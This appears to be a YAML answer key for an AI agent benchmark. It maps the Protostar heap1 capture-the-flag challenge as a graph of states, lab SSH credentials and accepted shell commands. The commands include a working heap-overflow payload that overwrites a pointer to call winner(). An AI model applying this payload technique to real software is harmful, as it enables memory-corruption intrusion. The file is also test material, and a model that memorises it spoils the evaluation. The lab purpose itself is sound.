@@ -1,0 +1,107 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: protostar_heap1
+  name: Protostar Heap One
+  description: Exploit adjacent heap structures so that a later write overwrites a code pointer with winner().
+attacker_context:
+  user: user
+  access:
+    method: ssh
+    credentials:
+      username: user
+      password: user
+  target:
+    host: <target-hostname-or-ip>
+    port: 22
+goal:
+  node: node4
+irrelevant_commands:
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- man
+- strings
+- checksec
+- file
+- ls
+- ls -la
+- env
+- printenv
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: winner() address recovered
+- id: node1
+  type: state
+  label: Heap object layout identified
+- id: node2
+  type: state
+  label: First argument crafted to corrupt second object
+- id: node3
+  type: state
+  label: Second argument crafted to overwrite pointer
+- id: node4
+  type: state
+  label: winner() invoked
+edges:
+- id: edge0
+  from: start
+  to: node0
+  action: recover_winner_symbol_address
+  accepted_commands:
+  - objdump -t /opt/protostar/bin/heap1 | grep " winner$"
+  - nm /opt/protostar/bin/heap1 | grep " winner$"
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*winner.*
+    stderr_regex: ^$
+- id: edge1
+  from: node0
+  to: node1
+  action: reason_about_adjacent_allocations
+  accepted_commands:
+  - gdb -q /opt/protostar/bin/heap1
+  - /opt/protostar/bin/heap1 A B
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*and that's a wrap folks!.*
+    stderr_regex: ^$
+- id: edge2
+  from: node1
+  to: node2
+  action: craft_first_argument_to_smash_next_structure
+  accepted_commands:
+  - python -c 'print "A"*20 + "\x68\xa0\x04\x08"'
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge3
+  from: node2
+  to: node3
+  action: craft_second_argument_to_write_winner_address
+  accepted_commands:
+  - python -c 'print "BBBB" + "\x64\x84\x04\x08"'
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge4
+  from: node3
+  to: node4
+  action: execute_corrupted_heap_write_sequence
+  accepted_commands:
+  - /opt/protostar/bin/heap1 $(python -c 'print "A"*20 + "\x68\xa0\x04\x08"') $(python -c 'print "BBBB" + "\x64\x84\x04\x08"')
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*winner.*
+    stderr_regex: ^$
